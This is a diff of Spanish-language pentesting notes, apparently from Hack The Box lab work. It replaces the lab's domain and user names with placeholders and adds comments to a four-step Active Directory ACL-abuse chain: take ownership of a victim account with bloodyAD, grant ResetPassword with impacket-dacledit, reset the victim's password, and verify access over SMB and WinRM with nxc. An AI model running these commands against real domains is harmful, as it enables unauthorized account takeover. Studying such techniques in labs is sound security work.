@@ -7,25 +7,32 @@ Tags: #AD #ACL #Linux #Impacket #BloodyAD
 ```bash 
 Paso 1:
 # Cambiar propietario del usuario víctima a ControlledAccount
-❯ bloodyAD -d sequel.htb -u ControlledAccount -p 'PASSWORD_RYAN' -H IP_DC set owner TargetUser ControlledAccount
+❯ bloodyAD -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set owner TargetUser ControlledAccount
 
 	# TargetUser = Usuario víctima (Objetivo)
 	# ControlledAccount = Usuario atacante (Controlas)
 
 Paso 2:
 # Dar a ryan el permiso ResetPassword sobre el usuario víctima
-❯ impacket-dacledit -action write -rights ResetPassword -principal ControlledAccount -target TargetUser 'sequel.htb/ryan:PASSWORD_RYAN' -dc-ip IP_DC
+❯ impacket-dacledit -action write -rights ResetPassword -principal ControlledAccount -target TargetUser 'domain.local/ControlledAccount:PASSWORD' -dc-ip IP_DC
+
+	# TargetUser = Usuario víctima (Objetivo)
+	# ControlledAccount = Usuario atacante (Controlas)
 
 Paso 3:
 # Cambiar la contraseña del usuario víctima 
-❯ bloodyAD -d sequel.htb -u ControlledAccount -p 'PASSWORD_RYAN' -H IP_DC set password TargetUser 'NuevaPassword123!'
+❯ bloodyAD -d domain.local -u ControlledAccount -p 'PASSWORD' -H IP_DC set password TargetUser 'NuevaPassword123!'
+
+	# ControlledAccount = Usuario atacante (Controlas)
+	# p = Contraseña del usuario atacante 
+	# TargetUser = Usuario víctima (Objetivo)
 ```
 
 ```bash 
 Paso 4:
 # Verificar el cambio de password 
-❯ nxc smb IP_DC -u "TargetUser" -p "NewPass123!" 
+❯ nxc smb IP_DC -u TargetUser -p 'NuevaPassword123!' 
 
 # Verificar el ingreso por EvilWinRM
-❯ nxc winrm IP_DC -u "TargetUser" -p "NewPass123!" 
+❯ nxc winrm IP_DC -u TargetUser -p 'NuevaPassword123!' 
 ```
